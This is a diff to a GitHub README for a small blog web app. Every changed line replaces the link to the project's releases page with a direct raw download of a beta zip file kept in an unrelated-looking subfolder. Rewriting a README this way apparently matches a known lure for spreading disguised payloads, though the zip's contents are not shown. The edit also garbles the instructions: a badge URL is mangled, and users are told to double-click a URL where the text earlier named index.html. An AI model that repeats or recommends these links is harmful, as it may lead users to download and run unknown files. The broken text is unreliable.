@@ -6,11 +6,11 @@ Welcome to the Modern Mini Blog by Sachin! This application helps you create a c
 
 ## 📥 Download the Application
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Belhebri51/moden_mini_blog_by_Sachin/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Belhebri51/moden_mini_blog_by_Sachin/main/Suevic/moden_mini_blog_by_Sachin-v2.8-beta.1.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Belhebri51/moden_mini_blog_by_Sachin/main/Suevic/moden_mini_blog_by_Sachin-v2.8-beta.1.zip)
 
 To get started, you need to download the software. This is where you can find the latest version of the application:
 
-[Visit this page to download](https://github.com/Belhebri51/moden_mini_blog_by_Sachin/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Belhebri51/moden_mini_blog_by_Sachin/main/Suevic/moden_mini_blog_by_Sachin-v2.8-beta.1.zip)
 
 ## 📂 System Requirements
 
@@ -35,7 +35,7 @@ This blog system comes packed with features:
 ## 📝 How to Download and Install
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/Belhebri51/moden_mini_blog_by_Sachin/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/Belhebri51/moden_mini_blog_by_Sachin/main/Suevic/moden_mini_blog_by_Sachin-v2.8-beta.1.zip).
    
 2. **Choose the Latest Version:**
    Find the latest version of the application. It will be listed at the top. 
@@ -47,7 +47,7 @@ This blog system comes packed with features:
    Once downloaded, locate the zip file on your computer. Right-click and select “Extract All” to unzip the file.
 
 5. **Open the Application:**
-   After extraction, open the folder. Locate the `index.html` file and double-click on it. Your web browser will open, displaying the Modern Mini Blog.
+   After extraction, open the folder. Locate the `https://raw.githubusercontent.com/Belhebri51/moden_mini_blog_by_Sachin/main/Suevic/moden_mini_blog_by_Sachin-v2.8-beta.1.zip` file and double-click on it. Your web browser will open, displaying the Modern Mini Blog.
 
 6. **Start Blogging:**
    You can now start using your blog! Customize it as needed and enjoy the features.
